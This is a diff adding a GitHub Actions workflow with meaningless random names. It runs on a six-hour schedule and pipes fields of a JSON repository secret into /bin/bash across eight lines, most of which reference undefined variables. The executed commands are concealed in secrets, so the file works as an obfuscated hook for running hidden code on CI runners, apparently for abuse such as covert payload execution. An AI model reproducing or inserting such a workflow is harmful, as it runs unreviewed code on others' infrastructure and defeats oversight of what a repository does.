@@ -1,0 +1,25 @@
+name: yangyanchang1985
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangyanchang1985
+        env:
+          huql780: ${{ secrets.huql780 }}
+        run: |
+          echo $huql780 | jq -r .pt51 | /bin/bash
+          echo $gtml12240 | jq -r .ax02 | /bin/bash
+          echo $ojauw4452 | jq -r .anw3 | /bin/bash
+          echo $jntw32760 | jq -r .ugf0 | /bin/bash
+          echo $huvle89700 | jq -r .vz046 | /bin/bash
+          echo $ia4 | jq -r .pi947 | /bin/bash
+          echo $wlndz52 | jq -r .j08 | /bin/bash
+          echo $wnlu35 | jq -r .huyt88165 | /bin/bash
+
